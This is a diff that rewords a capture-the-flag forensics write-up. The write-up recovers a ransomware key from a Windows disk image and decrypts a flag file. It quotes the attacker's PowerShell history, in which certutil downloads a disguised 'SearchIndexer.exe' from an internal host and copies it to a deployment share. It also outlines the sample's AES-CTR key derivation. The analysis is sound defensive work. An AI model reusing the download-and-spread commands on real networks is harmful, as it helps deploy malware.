@@ -15,7 +15,7 @@ mkdir mnt
 sudo mount -o ro /dev/loop1 mnt
 ```
 
-@eki found clues in `Users/tcollins/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt` of the ransomware:
+@eki found clues in `Users/tcollins/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt` from the ransomware:
 
 ```shell
 New-Item -Path "C:\Deployment" -ItemType Directory
@@ -24,11 +24,11 @@ certutil.exe -urlcache -f "http://10.3.90.1/SearchIndexer.exe" "C:\Users\Public\
 Copy-Item -Path "C:\Users\Public\Documents\SearchIndexer.exe" -Destination "\\SHR-SRV01\Deploy\SearchIndexer.exe"
 ```
 
-We decompiled the ransomware, and found its logic (contributed by @Xyzst):
+We decompiled the ransomware and discovered its logic (contributed by @Xyzst):
 
-1. read a 32 byte key from argv
-2. compute its sha256 for salt, use pbkdf2 to derive key, then compute iv using sha256 of key and salt
-3. use AES-CTR to encrypt/decrypt the files
+1. Read a 32-byte key from argv
+2. Compute its SHA256 for salt, use PBKDF2 to derive the key, then compute the IV using SHA256 of the key and salt
+3. Use AES-CTR to encrypt/decrypt files
 
 The 32 byte key can be found in `ProgramData/Microsoft/Group Policy/History/{DF23E480-0AAB-4A4A-8480-E1AF6E5F00EB}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml`:
 
@@ -71,10 +71,10 @@ print(f"Key: {hexlify(key).decode()}")
 print(f"IV: {hexlify(iv).decode()}")
 ```
 
-Then we can decrypt the `./Users/tcollins/Desktop/flag.txt.r47m02d16` given the known key and iv.
+With the known key and IV, we can decrypt `./Users/tcollins/Desktop/flag.txt.r47m02d16`.
 
-Actually, we used a simpler way to do this, but remember to backup your files on `C:\` first (we used wine, so `~/.wine/drive_c` and `~/Downloads` etc): 
+Alternatively, we used a simpler approach (remember to back up your files on `C:\` first—we used Wine, so `~/.wine/drive_c` and `~/Downloads`, etc.):
 
-1. copy `flag.txt.r47m02d16` to `C:\` drive, rename it to strip the suffix
-2. run `wine SearchIndexer.exe '7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&'`
-3. due to how AES-CTR works, the encrypted file now contains the flag itself
+1. Copy `flag.txt.r47m02d16` to the `C:\` drive and rename it to remove the suffix
+2. Run `wine SearchIndexer.exe '7kX#mP2$vL9@wQ4!nR8*jT6%hS1^dF3&'`
+3. Due to how AES-CTR works, the encrypted file now contains the flag itself
